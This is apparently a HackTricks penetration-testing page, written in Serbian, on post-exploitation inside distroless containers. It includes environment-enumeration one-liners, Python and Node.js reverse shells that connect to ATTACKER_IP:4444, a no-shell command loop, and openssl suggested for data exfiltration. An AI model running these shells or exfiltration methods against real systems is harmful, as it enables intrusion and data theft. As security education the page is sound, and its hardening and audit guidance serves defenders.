# Distroless kontejneri

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

**distroless** image kontejnera je image koji sadrži **minimalne runtime komponente potrebne za pokretanje jedne konkretne aplikacije**, uz namerno uklanjanje uobičajenih alata distribucije, kao što su package manageri, shell-ovi i veliki skupovi generičkih userland alata. U praksi, distroless image-ovi često sadrže samo binarni fajl aplikacije ili runtime, svoje shared library-je, certificate bundle-ove i veoma malu strukturu filesystem-a.

Poenta nije u tome da je distroless nova kernel isolation primitiva. Distroless je **strategija dizajna image-a**. Ona menja ono što je dostupno **unutar** filesystem-a kontejnera, a ne način na koji kernel izoluje kontejner. Ova razlika je važna, zato što distroless prvenstveno hardenuje okruženje tako što smanjuje ono što napadač može da koristi nakon dobijanja code execution-a. Ne zamenjuje namespaces, seccomp, capabilities, AppArmor, SELinux niti bilo koji drugi mehanizam runtime isolation-a.

## Zašto Distroless postoji

Distroless image-ovi se prvenstveno koriste za smanjenje:

- veličine image-a
- operativne kompleksnosti image-a
- broja package-ova i binarnih fajlova koji mogu sadržati vulnerabilities
- broja post-exploitation alata koji su napadaču podrazumevano dostupni

Zbog toga su distroless image-ovi popularni u production deployment-ima aplikacija. Kontejner koji ne sadrži shell, package manager i gotovo nikakve generičke alate obično je lakši za operativno razumevanje i teži za interaktivnu zloupotrebu nakon compromise-a.

Primeri poznatih porodica image-ova u distroless stilu obuhvataju:

- Google's distroless image-ove
- Chainguard hardened/minimal image-ove

## Šta Distroless ne znači

Distroless kontejner nije:

- automatski rootless
- automatski non-privileged
- automatski read-only
- automatski zaštićen pomoću seccomp-a, AppArmor-a ili SELinux-a
- automatski bezbedan od container escape-a

I dalje je moguće pokrenuti distroless image sa `--privileged`, deljenjem host namespace-a, opasnim bind mount-ovima ili mount-ovanim runtime socket-om. U tom scenariju image može biti minimalan, ali kontejner i dalje može biti katastrofalno nebezbedan. Distroless menja **userland attack surface**, a ne **kernel trust boundary**.

## Tipične operativne karakteristike

Kada kompromitujete distroless kontejner, prvo što obično primetite jeste da uobičajene pretpostavke više ne važe. Možda nema `sh`, `bash`, `ls`, `id`, `cat`, a ponekad čak ni libc-based okruženja koje se ponaša onako kako vaš uobičajeni tradecraft očekuje. Ovo utiče i na offense i na defense, zato što nedostatak alata debugging, incident response i post-exploitation čini drugačijim.

Najčešći obrasci su:

- application runtime postoji, ali gotovo ničeg drugog nema
- shell-based payloads ne uspevaju zato što nema shell-a
- uobičajeni enumeration one-liner-i ne uspevaju zato što pomoćni binarni fajlovi nedostaju
- filesystem zaštite, kao što su read-only rootfs ili `noexec` na writable tmpfs lokacijama, često su takođe prisutne

Ova kombinacija je ono zbog čega ljudi obično govore o "weaponizing distroless".

## Distroless i Post-Exploitation

Glavni offensive izazov u distroless okruženju nije uvek početni RCE. Često je problem ono što sledi. Ako compromised workload omogućava code execution u language runtime-u kao što su Python, Node.js, Java ili Go, možda možete izvršavati proizvoljnu logiku, ali ne i kroz uobičajene shell-centric workflow-e koji su česti na drugim Linux targetima.

To znači da se post-exploitation često kreće u jednom od tri pravca:

1. **Direktno korišćenje postojećeg language runtime-a** za enumeration okruženja, otvaranje socket-a, čitanje fajlova ili staging dodatnih payload-a.
2. **Unošenje sopstvenih alata u memoriju** ako je filesystem read-only ili su writable lokacije mount-ovane sa `noexec`.
3. **Zloupotreba postojećih binarnih fajlova koji su već prisutni u image-u** ako aplikacija ili njene dependencies sadrže nešto neočekivano korisno.

## Zloupotreba

### Enumeracija Runtime-a koji već imate

U mnogim distroless kontejnerima nema shell-a, ali i dalje postoji application runtime. Ako je target Python servis, Python je prisutan. Ako je target Node.js, Node je prisutan. To često pruža dovoljno funkcionalnosti za enumeration fajlova, čitanje environment variables, otvaranje reverse shell-ova i staging in-memory execution-a, bez ikakvog pozivanja `/bin/sh`.

Jednostavan primer sa Python-om:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Jednostavan primer sa Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- oporavak environment variables, koji često uključuju credentials ili service endpoints
- enumeracija filesystem-a bez `/bin/ls`
- identifikacija writable putanja i mounted secrets

### Reverse Shell Without `/bin/sh`

Ako image ne sadrži `sh` ili `bash`, klasični reverse shell zasnovan na shell-u može odmah da ne uspe. U toj situaciji koristite instalirani language runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Ako `/bin/sh` ne postoji, zamenite poslednju liniju direktnim izvršavanjem komandi pomoću Python-a ili petljom Python REPL-a.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ponovo, ako `/bin/sh` nije prisutan, koristite Node API-je za filesystem, procese i networking direktno umesto pokretanja shell-a.

### Full Example: No-Shell Python Command Loop

Ako image sadrži Python, ali uopšte nema shell, jednostavna interaktivna petlja često je dovoljna za zadržavanje pune post-exploitation funkcionalnosti:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Ovo ne zahteva interaktivni shell binary. Uticaj je iz perspektive napadača praktično isti kao kod osnovnog shell-a: izvršavanje komandi, enumeracija i staging dodatnih payload-a kroz postojeći runtime.

### Izvršavanje alata u memoriji

Distroless image-i se često kombinuju sa:

- `readOnlyRootFilesystem: true`
- writable, ali `noexec` tmpfs kao što je `/dev/shm`
- nedostatkom alata za upravljanje paketima

Ta kombinacija čini klasične workflow-e tipa „preuzmi binary na disk i pokreni ga“ nepouzdanim. U tim slučajevima tehnike izvršavanja iz memorije postaju glavno rešenje.

Posvećena stranica za to je:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Najrelevantnije tehnike tamo su:

- `memfd_create` + `execve` putem scripting runtime-a
- DDexec / EverythingExec
- memexec
- memdlopen

### Postojeći binary-ji koji se već nalaze u image-u

Neki Distroless image-i i dalje sadrže operativno neophodne binary-je koji postaju korisni nakon kompromitacije. Primer koji se često uočava je `openssl`, jer aplikacijama ponekad treba za zadatke povezane sa cryptography ili TLS-om.

Brz obrazac za pretragu je:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Ako je `openssl` prisutan, može se koristiti za:

- outbound TLS connections
- data exfiltration preko dozvoljenog egress kanala
- staging payload podataka kroz kodirane/šifrovane blobove

Tačna zloupotreba zavisi od toga šta je zaista instalirano, ali opšta ideja je da distroless ne znači „bez ikakvih alata“; znači „mnogo manje alata nego u standardnom distribution image-u“.

## Provere

Cilj ovih provera je da se utvrdi da li je image zaista distroless u praksi i koji runtime ili pomoćni binarni fajlovi su još uvek dostupni za post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Šta je ovde zanimljivo:

- Ako ne postoji shell, ali je prisutan runtime kao što su Python ili Node, post-exploitation treba preusmeriti na izvršavanje zasnovano na runtime-u.
- Ako je root filesystem read-only, a `/dev/shm` writable, ali sa `noexec`, memory execution tehnike postaju mnogo relevantnije.
- Ako postoje pomoćni binarni fajlovi kao što su `openssl`, `busybox` ili `java`, oni mogu pružiti dovoljno funkcionalnosti za uspostavljanje daljeg pristupa.

## Podrazumevane postavke runtime-a

| Stil image-a / platforme | Podrazumevano stanje | Tipično ponašanje | Uobičajeno ručno oslabljivanje |
| --- | --- | --- | --- |
| Google distroless style images | Minimalni userland po dizajnu | Nema shell-a, package manager-a ni dodatnih komponenti, već samo zavisnosti aplikacije/runtime-a | dodavanje debugging slojeva, sidecar shell-ova, kopiranje busybox-a ili alata |
| Chainguard minimal images | Minimalni userland po dizajnu | Smanjena package površina, često usmerena na jedan runtime ili servis | korišćenje `:latest-dev` ili debug varijanti, kopiranje alata tokom build-a |
| Kubernetes workloads koji koriste distroless images | Zavisi od Pod config-a | Distroless utiče samo na userland; bezbednosni položaj Pod-a i dalje zavisi od Pod spec-a i podrazumevanih postavki runtime-a | dodavanje ephemeral debug container-a, host mount-ova, privilegovanih Pod postavki |
| Docker / Podman koji pokreću distroless images | Zavisi od run flag-ova | Minimalni filesystem, ali bezbednost runtime-a i dalje zavisi od flag-ova i konfiguracije daemon-a | `--privileged`, deljenje host namespace-a, mount-ovanje runtime socket-a, writable host bind-ovi |

Ključna stvar je da je distroless **svojstvo image-a**, a ne zaštita runtime-a. Njegova vrednost proizlazi iz smanjenja onoga što je dostupno unutar filesystem-a nakon kompromitovanja.

## Povezane stranice

Za filesystem i memory-execution bypass-e koji su često potrebni u distroless okruženjima:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Za zloupotrebu container runtime-a, socket-a i mount-ova koja se i dalje odnosi na distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
